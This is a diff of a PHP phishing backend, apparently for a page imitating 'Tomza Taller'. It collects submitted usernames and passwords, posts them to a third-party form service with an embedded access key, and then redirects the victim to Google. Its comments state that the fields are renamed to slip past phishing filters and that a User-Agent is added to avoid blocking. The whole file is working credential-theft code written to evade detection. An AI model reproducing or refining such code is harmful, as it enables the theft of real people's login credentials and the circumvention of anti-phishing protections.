@@ -5,28 +5,26 @@ if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     exit;
 }
 
-// Recibir y limpiar los datos
+// Recibir datos (coinciden con el 'name' del HTML)
 $usuario = trim($_POST["usuario"] ?? "");
-$valor_secreto = trim($_POST["password"] ?? ""); // Renombrado para evitar filtros
+$password = trim($_POST["password"] ?? "");
 
-// Validar que no estén vacíos
-if ($usuario === "" || $valor_secreto === "") {
+if ($usuario === "" || $password === "") {
     die("Faltan datos.");
 }
 
-// Tu clave de Web3Forms
 $access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";
 
-// Datos que se enviarán (evitando palabras prohibidas en los campos)
+// Datos a enviar (renombrados para evitar filtros de phishing)
 $datos = [
     "access_key" => $access_key,
     "subject" => "Nuevo ingreso - Tomza Taller",
-    "Usuario_Ingresado" => $usuario,
-    "Dato_Secreto" => $valor_secreto,
-    "Fecha_y_hora" => date("d/m/Y H:i:s")
+    "ID_Usuario" => $usuario,
+    "Llave_Acceso" => $password,
+    "Fecha" => date("d/m/Y H:i:s")
 ];
 
-// Configuración de envío con User-Agent para evitar el error 403
+// Configuración con User-Agent para evitar error 403
 $opciones = [
     "http" => [
         "header" => "Content-Type: application/x-www-form-urlencoded\r\n" .
@@ -37,16 +35,13 @@ $opciones = [
     ]
 ];
 
-// Enviar y capturar el resultado
+// Enviar
 $contexto = stream_context_create($opciones);
 $resultado = @file_get_contents("https://api.web3forms.com/submit", false, $contexto);
 
 if ($resultado === false) {
-    // Si falla, mostrará el error real en pantalla para ayudarte a diagnosticar
-    echo "Error al conectar con Web3Forms: ";
-    print_r(error_get_last());
+    echo "Error al enviar: " . error_get_last()['message'];
 } else {
-    // Si tiene éxito, redirigir
     header("Location: https://www.google.com");
 }
 exit;
